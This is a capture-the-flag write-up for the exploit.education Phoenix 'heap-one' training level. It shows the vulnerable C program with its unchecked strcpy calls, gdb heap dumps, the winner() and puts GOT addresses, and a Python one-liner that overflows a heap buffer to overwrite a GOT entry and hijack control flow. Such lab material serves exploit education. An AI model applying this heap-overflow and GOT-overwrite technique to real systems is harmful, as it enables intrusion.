# Heap-One

## Code
```
/*
 * phoenix/heap-zero, by https://exploit.education
 *
 * Can you hijack flow control?
 *
 * Which vegetable did Noah leave off the Ark?
 * Leeks
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct heapStructure {
  int priority;
  char *name;
};

int main(int argc, char **argv) {
  struct heapStructure *i1, *i2;

  i1 = malloc(sizeof(struct heapStructure));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct heapStructure));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}

void winner() {
  printf(
      "Congratulations, you've completed this level @ %ld seconds past the "
      "Epoch\n",
      time(NULL));
}"
```

## Solution

To resolve this we need to know the distance between i1->name and the pointer of i2->name, by reading the heap we can calculate it that it is 20:

```
After the 2 strcpy do
(gdb) x/100x $eax-48
0xf7e69008:     0x00000001      0xf7e69018      0x00000000      0x00000011
0xf7e69018:     0x41414141      0x00000000      0x00000000      0x00000011
0xf7e69028:     0x00000002      0xf7e69038      0x00000000      0x00000011
0xf7e69038:     0x42424242      0x00000000      0x00000000      0x000fffc1
```
The distance between 0xf7e69018 and 0xf7e6902c is 20 in decimal.

Now we need to retrive the address of the winning function

```
objdump -d heap-one | grep winner
0804889a <winner>
```

Then we need the address of the PUTS in the plt.

```
0x8048883 <main+174>       call   0x80485b0 <puts@plt>
(gdb)   disas 0x80485b0
Dump of assembler code for function puts@plt:
   0x080485b0 <+0>:     jmp    DWORD PTR ds:0x804c140
   0x080485b6 <+6>:     push   0x28
   0x080485bb <+11>:    jmp    0x8048550
End of assembler dump.

```
It is at 0x804c140.

The script will be:

```
./heap-one $(python -c 'import struct; print("A"*20+struct.pack("<I",0x804c140)+" "+struct.pack("<I", 0x0804889a))')
```
